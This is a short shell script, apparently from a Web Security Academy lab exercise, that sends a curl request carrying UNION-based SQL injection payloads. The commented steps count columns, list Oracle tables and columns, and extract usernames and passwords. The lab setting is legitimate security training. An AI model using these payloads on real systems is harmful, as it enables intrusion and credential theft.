BASE_URL="https://0a9d003a0367da5480e0ee2800de0089.web-security-academy.net"
ENDPOINT="/filter"

# The query returns two columns, server error generated for 3. So our query is returning two columns.
# NOTE the space after the --, which is required to comment out the rest of the query!
# QUERY="category=Gifts%27+ORDER+BY+2--+"

# Start with table names
# QUERY="category=Whocares%27+UNION+SELECT+TABLE_NAME%2CNULL+FROM+all_tables--+"

# Found a table named USERS_DZERNW
# Can we get column names? Yes!
# QUERY="category=Whocares%27+UNION+SELECT+TABLE_NAME%2CCOLUMN_NAME+FROM+all_tab_columns+WHERE+TABLE_NAME=%27USERS_DZERNW%27--+"

# The column names are USERNAME_FGCHKT and PASSWORD_PMIJED
QUERY="category=Whocares%27+UNION+SELECT+USERNAME_FGCHKT%2CPASSWORD_PMIJED+FROM+USERS_DZERNW--+"

# Found administrator and password!

out=$(curl "${BASE_URL}${ENDPOINT}?${QUERY}")
echo "$out"
